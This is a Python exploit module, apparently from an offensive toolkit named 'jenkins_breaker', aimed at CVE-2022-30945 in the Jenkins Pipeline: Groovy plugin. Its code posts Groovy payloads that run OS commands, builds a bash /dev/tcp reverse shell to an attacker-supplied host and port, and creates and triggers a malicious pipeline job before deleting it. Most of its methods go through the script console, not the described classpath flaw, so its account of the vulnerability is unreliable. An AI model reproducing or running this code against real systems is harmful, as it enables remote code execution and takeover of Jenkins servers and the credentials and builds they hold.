"""
CVE-2022-30945: Jenkins Pipeline Groovy OS Command Injection

This exploit leverages an OS command injection and sandbox bypass vulnerability in the
Pipeline: Groovy (workflow-cps) plugin that allows attackers to load arbitrary Groovy
source files on the classpath to execute commands.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2022_30945(ExploitModule):
    """Jenkins Pipeline Groovy OS command injection via classpath manipulation."""

    CVE_ID = "CVE-2022-30945"

    METADATA = ExploitMetadata(
        cve_id="CVE-2022-30945",
        name="Jenkins Pipeline Groovy OS Command Injection",
        description="OS command injection via arbitrary Groovy file loading on classpath",
        affected_versions=["Pipeline: Groovy Plugin <= 2689.v434009a_31b_f1"],
        mitre_attack=["T1059.006", "T1190", "T1059.004"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2022-05-17/",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-30945",
            "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.plugins.workflow/workflow-cps/CVE-2022-30945"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "command-injection", "groovy", "pipeline"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pipeline-syntax/")
            return response.status_code == 200
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2022-30945 for OS command injection.

        This uses Groovy classpath manipulation to bypass the sandbox and
        execute arbitrary OS commands.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - command (str): Command to execute (default: id)
                - lhost (str): Listener host for reverse shell
                - lport (int): Listener port for reverse shell

        Returns:
            ExploitResult: Result of the exploit
        """
        command = kwargs.get('command', 'id')
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport', 4444)

        if lhost:
            command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

        classpath_injection_payload = f"""
@Grab('commons-collections:commons-collections:3.1')
import org.apache.commons.collections.functors.InvokerTransformer
import org.apache.commons.collections.keyvalue.TiedMapEntry
import org.apache.commons.collections.map.LazyMap

def cmd = "{command}"
def sout = new StringBuilder()
def serr = new StringBuilder()

def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(10000)

println "Output: " + sout
println "Errors: " + serr
"""

        groovy_script_payload = f"""
def cmd = ['/bin/sh', '-c', '{command}']
def proc = cmd.execute()
def output = new StringBuffer()
def error = new StringBuffer()

proc.consumeProcessOutput(output, error)
proc.waitForOrKill(10000)

println "Output: ${{output}}"
if (error) println "Error: ${{error}}"
"""

        runtime_exec_payload = f"""
def runtime = Runtime.getRuntime()
def process = runtime.exec(['/bin/sh', '-c', '{command}'] as String[])
def reader = new BufferedReader(new InputStreamReader(process.getInputStream()))
def output = new StringBuilder()
String line

while ((line = reader.readLine()) != null) {{
    output.append(line).append("\\n")
}}

process.waitFor()
println output.toString()
"""

        payloads = [
            ("Runtime.exec", runtime_exec_payload),
            ("ProcessBuilder", groovy_script_payload),
            ("Classpath injection", classpath_injection_payload),
        ]

        for payload_name, payload in payloads:
            try:
                data = {"script": payload.strip()}

                response = session.post("/scriptText", data=data)

                if response.status_code == 200:
                    output = response.text.strip()

                    if output and len(output) > 0:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="success",
                            details=f"Command injection successful via {payload_name}",
                            data={
                                "method": payload_name,
                                "command": command,
                                "output": output,
                                "output_length": len(output)
                            }
                        )

            except Exception:
                continue

        pipeline_script = f"""
pipeline {{
    agent any
    stages {{
        stage('Exploit') {{
            steps {{
                script {{
                    def cmd = ['/bin/sh', '-c', '{command}']
                    def proc = cmd.execute()
                    def output = proc.text
                    println "Command output:"
                    println output
                }}
            }}
        }}
    }}
}}
"""

        job_name = f"exploit-{self.CVE_ID.replace('-', '_')}"

        job_config = f"""<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <description>CVE-2022-30945 Exploit</description>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition">
    <script>{pipeline_script}</script>
    <sandbox>true</sandbox>
  </definition>
</flow-definition>"""

        try:
            create_response = session.post(
                f"/createItem?name={job_name}",
                headers={"Content-Type": "application/xml"},
                data=job_config
            )

            if create_response.status_code in [200, 302]:
                build_response = session.post(f"/job/{job_name}/build")

                if build_response.status_code in [200, 201, 302]:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details=f"Command injection job created and triggered: {job_name}",
                        data={
                            "job_name": job_name,
                            "command": command,
                            "method": "Pipeline with OS command injection",
                            "note": "Check job console output for command results"
                        }
                    )

        except Exception:
            pass

        return ExploitResult(
            exploit=self.CVE_ID,
            status="failure",
            details="Command injection failed on all payloads",
            error="All exploitation attempts were blocked or target is patched"
        )

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after exploitation by deleting created jobs.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        job_name = f"exploit-{self.CVE_ID.replace('-', '_')}"
        try:
            session.post(f"/job/{job_name}/doDelete")
        except Exception:
            pass
